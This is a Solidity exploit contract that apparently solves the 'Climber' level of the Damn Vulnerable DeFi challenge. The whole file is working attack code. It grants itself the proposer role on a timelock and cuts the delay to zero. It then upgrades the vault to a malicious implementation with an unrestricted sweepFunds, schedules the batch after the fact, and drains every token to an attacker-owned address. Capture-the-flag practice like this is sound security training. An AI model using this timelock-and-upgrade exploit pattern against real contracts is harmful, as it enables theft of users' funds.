// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../climber/ClimberTimelock.sol";
import "../DamnValuableToken.sol";

contract ExploitClimber {
    address payable public timelock;
    address public oldVault;
    address public newVault;

    address public owner;
    address public token;

    //calldata for schedule/execute
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    constructor(
        address payable _timelock,
        address _oldVault,
        address _newVault,
        address _owner,
        address _token
    ) {
        timelock = _timelock;
        oldVault = _oldVault;
        newVault = _newVault;
        owner = _owner;
        token = _token;
    }

    function attack() external {
        //1) give us the proposer role
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        //2) reduce delay to 0
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );

        //3) upgrade the vault implementation to our new ExploitVault contract
        targets.push(oldVault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeTo(address)", newVault)
        );

        //4) call our schedule function which will call schedule of timelock
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("ourSchedule()"));

        //call execute
        ClimberTimelock(timelock).execute(
            targets,
            values,
            dataElements,
            bytes32("")
        );

        //Now that the implementation has upgraded to the new vault, we can sweep the funds and send them to our owner account
        ExploitVault(oldVault).sweepFunds(token);
        DamnValuableToken(token).transfer(
            owner,
            DamnValuableToken(token).balanceOf(address(this))
        );
    }

    //only use to get the right calldata to get the right OperationId
    function ourSchedule() public {
        ClimberTimelock(timelock).schedule(
            targets,
            values,
            dataElements,
            bytes32("")
        );
    }
}

contract ExploitVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    //We have to keep this function implementation from UUPSUpgradeable
    function _authorizeUpgrade(address newImplementation)
        internal
        override
        onlyOwner
    {}
}
